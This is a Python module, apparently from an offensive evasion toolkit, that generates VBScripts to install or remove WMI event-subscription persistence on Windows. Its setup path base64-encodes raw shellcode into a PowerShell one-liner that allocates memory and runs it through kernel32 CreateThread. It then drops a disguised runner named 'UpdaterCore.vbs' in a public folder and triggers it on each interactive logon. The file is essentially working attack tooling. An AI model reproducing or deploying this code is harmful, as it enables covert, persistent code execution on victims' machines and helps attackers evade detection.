import os
import base64
from jinja2 import Environment, FileSystemLoader
from core import EvasionTechnique
from utils.helpers import get_output_path
from config import TEMPLATE_DIRS

def escape_vbs_content_for_embedding(vbs_content):
    """
    Escapes VBScript content to be embedded as a string constant within another VBScript.
    Each line is quoted, internal quotes are doubled, and lines are concatenated with vbCrLf.
    """
    if not vbs_content:
        return "\"\""  # Represents an empty VBScript string literal: ""

    lines = vbs_content.splitlines()
    escaped_vbs_lines = []

    if not lines:
        return "\"\""

    for i, line in enumerate(lines):
        # Escape double quotes within the line by replacing them with two double quotes
        line_processed = line.replace('"', '""')
        current_line_quoted = f'"{line_processed}"'
        
        if i < len(lines) - 1:
            # Add concatenation operator and line continuation for all but the last line
            escaped_vbs_lines.append(current_line_quoted + " & vbCrLf & _")
        else:
            # Last line does not need concatenation or continuation
            escaped_vbs_lines.append(current_line_quoted)
    
    # Join the formatted lines with a newline for readability in the generated source,
    # though VBScript itself doesn't strictly need the newlines for these concatenated strings.
    return '\n'.join(escaped_vbs_lines)

class WMIPersistence(EvasionTechnique):
    def __init__(self):
        super().__init__(
            name="wmi-persistence",
            description="Generates VBScripts to set up or remove WMI-based persistence for shellcode execution.",
            options=[
                {'name': '--action', 'type': 'str', 'required': True, 'help': "Action: 'setup' or 'remove'."},
                {'name': '--payload', 'type': 'str', 'required': False, 'help': "Path to raw shellcode (for 'setup')."},
                {'name': '--output', 'type': 'str', 'required': True, 'help': "Output VBS filename (e.g., wmi_control.vbs)."},
                {'name': '--filter-name', 'type': 'str', 'default': "CAVEWMIEventFilter", 'help': "WMI Event Filter name."},
                {'name': '--consumer-name', 'type': 'str', 'default': "CAVEWMIEventConsumer", 'help': "WMI Event Consumer name."},
                {'name': '--payload-script-name', 'type': 'str', 'default': "UpdaterCore.vbs", 'help': "Filename for dropped VBS payload runner."},
                {'name': '--payload-drop-dir', 'type': 'str', 'default': "C:\\Users\\Public\\Libraries", 'help': "Directory to drop payload VBS."},
                {'name': '--wql-query', 'type': 'str', 
                 'default': "SELECT * FROM __InstanceCreationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2", 
                 'help': "WQL query for setup (default: on interactive logon)."}
            ]
        )

    def generate(self, **kwargs):
        action = kwargs['action'].lower()
        output_filename = kwargs['output']
        filter_name = kwargs['filter_name']
        consumer_name = kwargs['consumer_name']
        payload_script_name = kwargs['payload_script_name']
        payload_drop_dir = kwargs['payload_drop_dir']
        
        # Construct the path for the VBS templates. VBS needs literal backslashes.
        payload_runner_path_for_vbs = os.path.join(payload_drop_dir, payload_script_name).replace("/", "\\")

        env = Environment(loader=FileSystemLoader(TEMPLATE_DIRS), trim_blocks=True, lstrip_blocks=True)

        if action == 'setup':
            payload_file_path = kwargs.get('payload')
            wql_query = kwargs['wql_query']
            if not payload_file_path:
                print("[!] Error: --payload is required for 'setup' action.")
                return

            print(f"[*] Generating WMI Persistence Setup Script: '{output_filename}'")
            try:
                with open(payload_file_path, 'rb') as f:
                    shellcode = f.read()
                if not shellcode:
                    print(f"[!] Error: Payload file '{payload_file_path}' is empty.")
                    return
            except FileNotFoundError:
                print(f"[!] Error: Payload file '{payload_file_path}' not found.")
                return
            except Exception as e:
                print(f"[!] Error reading payload file '{payload_file_path}': {e}")
                return

            b64_shellcode_for_ps = base64.b64encode(shellcode).decode('utf-8')
            # PowerShell one-liner for shellcode execution
            ps_command = (
                f"$s=[System.Convert]::FromBase64String('{b64_shellcode_for_ps}');"
                f"$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($s.Length);"
                f"[System.Runtime.InteropServices.Marshal]::Copy($s,0,$m,$s.Length);"
                f"$t=Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern System.IntPtr CreateThread(System.IntPtr lpThreadAttributes,uint dwStackSize,System.IntPtr lpStartAddress,System.IntPtr lpParameter,uint dwCreationFlags,out System.UIntPtr lpThreadId);' -Name K32 -PassThru -EA SilentlyContinue;"
                f"if($t){{$id=[System.UIntPtr]::Zero;$t::CreateThread(0,0,$m,0,0,[ref]$id)|Out-Null;}}"
            )
            powershell_command_b64_for_runner = base64.b64encode(ps_command.encode('utf-16-le')).decode('utf-8')
            print("[*] PowerShell command for payload runner prepared and Base64 encoded.")

            try:
                payload_runner_template = env.get_template("vbs/wmi_payload_runner.vbs")
                payload_runner_vbs_content_raw = payload_runner_template.render(
                    powershell_command_b64=powershell_command_b64_for_runner
                )
            except Exception as e:
                print(f"[!] Error rendering wmi_payload_runner.vbs template: {e}")
                return
            
            payload_runner_vbs_content_escaped = escape_vbs_content_for_embedding(payload_runner_vbs_content_raw)

            try:
                setup_template = env.get_template("vbs/wmi_setup_persistence.vbs")
                # Ensure paths and queries are correctly formatted for VBS strings within the template
                setup_vbs_code = setup_template.render(
                    event_filter_name=filter_name,
                    event_consumer_name=consumer_name,
                    payload_runner_path=payload_runner_path_for_vbs, # This path should be a clean string VBS can use
                    wql_query=wql_query, # WQL query as a string
                    payload_runner_content_escaped=payload_runner_vbs_content_escaped
                )
            except Exception as e:
                print(f"[!] Error rendering wmi_setup_persistence.vbs template: {e}")
                return
            
            final_output_path = get_output_path(output_filename)
            try:
                with open(final_output_path, 'w') as f:
                    f.write(setup_vbs_code)
                print(f"[SUCCESS] WMI Setup script generated: {final_output_path}")
                print(f"    It will attempt to drop '{payload_runner_path_for_vbs}'.")
            except Exception as e:
                print(f"[!] Error writing WMI Setup script to '{final_output_path}': {e}")

        elif action == 'remove':
            print(f"[*] Generating WMI Persistence Removal Script: '{output_filename}'")
            try:
                remove_template = env.get_template("vbs/wmi_remove_persistence.vbs")
                remove_vbs_code = remove_template.render(
                    event_filter_name=filter_name,
                    event_consumer_name=consumer_name,
                    payload_runner_path=payload_runner_path_for_vbs
                )
            except Exception as e:
                print(f"[!] Error rendering wmi_remove_persistence.vbs template: {e}")
                return

            final_output_path = get_output_path(output_filename)
            try:
                with open(final_output_path, 'w') as f:
                    f.write(remove_vbs_code)
                print(f"[SUCCESS] WMI Removal script generated: {final_output_path}")
                print(f"    It will attempt to remove components associated with '{filter_name}' and delete '{payload_runner_path_for_vbs}'.")
            except Exception as e:
                print(f"[!] Error writing WMI Removal script to '{final_output_path}': {e}")
        else:
            print(f"[!] Invalid action: '{action}'. Choose 'setup' or 'remove'.")